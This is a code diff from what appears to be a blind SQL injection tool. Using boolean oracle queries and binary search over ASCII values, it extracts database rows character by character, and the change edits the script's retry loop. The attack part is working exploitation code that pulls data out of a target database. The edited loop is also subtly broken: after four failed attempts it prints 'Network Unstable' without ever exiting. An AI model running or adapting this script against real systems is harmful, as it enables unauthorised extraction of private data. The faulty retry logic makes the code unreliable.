@@ -119,7 +119,7 @@ for offset in range(0, RowCount):
         low = 32 # 可打印ASCII字符范围 32-127
         high = 127
         attempt = 0
-        while(attempt < 4):
+        while(True):
             while low < high:
                 mid = (low + high) // 2
                 if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) > {mid}"):
@@ -129,8 +129,10 @@ for offset in range(0, RowCount):
             if oracle(f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {filters} ORDER BY {column} OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY),{i},1)) = {low}"):
                 print(chr(low), end='')
                 break
-            else:
+            elif (attempt < 4):
                 attempt = attempt + 1
+            else:
+                print("Network Unstable")
         sys.stdout.flush()
     print()
     print()
